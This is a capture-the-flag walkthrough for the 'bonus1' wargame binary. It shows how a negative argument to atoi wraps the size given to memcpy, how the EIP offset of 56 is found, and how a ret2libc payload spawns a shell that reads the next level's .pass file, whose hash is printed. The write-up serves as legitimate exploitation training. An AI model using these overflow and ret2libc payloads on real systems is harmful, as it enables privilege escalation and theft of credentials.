# 💥 Bonus1 - Exploit Walkthrough
## 🧪 First Step - Testing the Program
```bash
$ ./bonus1
Segmentation fault (core dumped)
$ ./bonus1 coucou
$ ./bonus1 coucou coucou
```
- ⚠️ The binary crashes without parameters.
- 🧩 Accepts arguments, but causes a segmentation fault under certain conditions.

## 🐞 Run in GDB
```bash
$ gdb -q ./bonus1
(gdb) disas main
```
- 🔍 Disassembly shows:
- - atoi(argv[1]) is used and checked if ≤ 9.
- - memcpy() is called with an attacker-controlled size.
- - There’s a call to execl("/bin/sh", "sh", 0) only if a certain value is matched.

```asm
0x08048438 <+20>: call   0x8048360 <atoi@plt>
...
0x08048473 <+79>: call   0x8048320 <memcpy@plt>
...
0x08048499 <+117>: call   0x8048350 <execl@plt>
```
- 💡 There's a classic buffer overflow vulnerability due to improper memcpy() bounds checking.

## 🧠 Vulnerability Analysis
- 🧮 The input number is multiplied by 4 and used as a size argument for memcpy(dest, src, size).
- ✨ If a negative number is given, it wraps around as a large unsigned int, leading to buffer overflow.
- 🧱 The buffer is 64 bytes (0x40), and overflowing past it allows overwriting EIP.

## 🔍 Finding the Offset
```bash
$ ./bonus1 -1073741803 $(python -c 'print("A"*100)')
```
- 💥 Causes a segfault and overwrites EIP.
- 🧪 Pattern-based analysis shows that EIP is overwritten after 56 bytes.
- 🎯 Offset = 56

## 🔧 Preparing Ret2Libc Attack
- 🪝 Goal: Jump to system("/bin/sh")
- 🧵 Strings and addresses from the binary:

```bash
$ strings -tx ./bonus1 | grep /bin/sh
8048583 /bin/sh
```gdb
(gdb) info functions system
0xb7e6b060  system
```
- 📦 Payload structure:
```css
[ "B" * 56 ] +
[ system@libc ] +
[ junk return addr ] +
[ "/bin/sh" string addr ]
```

## 🚀 Final Exploit
```bash
$ ./bonus1 -1073741803 $(python -c 'print("B"*56 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x83\x85\x04\x08")')
$ whoami
bonus2
$ cat ~bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
- 🎉 Done!
